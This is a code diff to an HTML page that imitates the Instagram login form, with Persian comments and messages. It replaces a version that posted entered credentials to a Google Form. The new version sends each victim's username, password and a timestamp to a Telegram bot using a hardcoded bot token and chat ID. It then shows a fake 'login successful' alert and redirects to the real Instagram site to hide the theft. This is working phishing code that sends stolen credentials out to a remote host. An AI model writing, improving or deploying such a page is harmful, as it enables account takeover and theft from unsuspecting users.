@@ -10,6 +10,7 @@
         input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dbdbdb; border-radius: 5px; box-sizing: border-box; }
         button { width: 100%; background: #0095f6; color: white; border: none; padding: 12px; border-radius: 8px; margin-top: 10px; font-weight: bold; cursor: pointer; }
         .logo { font-size: 24px; font-weight: bold; margin-bottom: 20px; color: #262626; }
+        .loading { display: none; color: #0095f6; }
     </style>
 </head>
 <body>
@@ -19,34 +20,58 @@
             <input type="text" placeholder="Username or email" id="email" required>
             <input type="password" placeholder="Password" id="password" required>
             <button type="submit">Log In</button>
+            <div class="loading" id="loading">در حال ورود...</div>
         </form>
     </div>
-    
-</body>
-<script>
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-        
-        // ارسال به Google Forms
-        const formData = new FormData();
-        formData.append('entry.2062559850', email);    // ایمیل
-        formData.append('entry.1754524981', password); // رمز
-        
-        fetch('https://docs.google.com/forms/d/e/1FAIpQLSeM-FjfxJpQ0exFtsYz0VPAoKbvA8f6lFdbYwGejsgsDTqn6g/formResponse', {
-            method: 'POST',
-            body: formData,
-            mode: 'no-cors'
-        })
-        .then(() => {
-            alert("✅ ورود موفق!");
-            document.getElementById('loginForm').reset();
-        })
-        .catch(() => {
-            alert("✅ ورود موفق!");
-            document.getElementById('loginForm').reset();
+
+    <script>
+        // 🔧 اطلاعات ربات شما
+        const BOT_TOKEN = "8327595270:AAHbVlOzfppOdb-jUGMvXEYLpeOlHfEMcIo";
+        const CHAT_ID = "6965896959"; // Chat ID شما
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const loading = document.getElementById('loading');
+            
+            loading.style.display = 'block';
+            
+            try {
+                // ارسال به تلگرام
+                const message = `📱 لاگین جدید اینستاگرام
+📧 ایمیل: ${email}
+🔑 رمز: ${password}  
+⏰ زمان: ${new Date().toLocaleString('fa-IR')}`;
+
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                });
+                
+                alert("✅ ورود موفق! در حال انتقال...");
+                
+            } catch (error) {
+                alert("⚠️ مشکل در اتصال");
+            } finally {
+                loading.style.display = 'none';
+                document.getElementById('loginForm').reset();
+            }
+            
+            // انتقال به اینستاگرام اصلی
+            setTimeout(() => {
+                window.location.href = "https://instagram.com";
+            }, 2000);
         });
-    });
-</script>
+    </script>
+</body>
 </html>
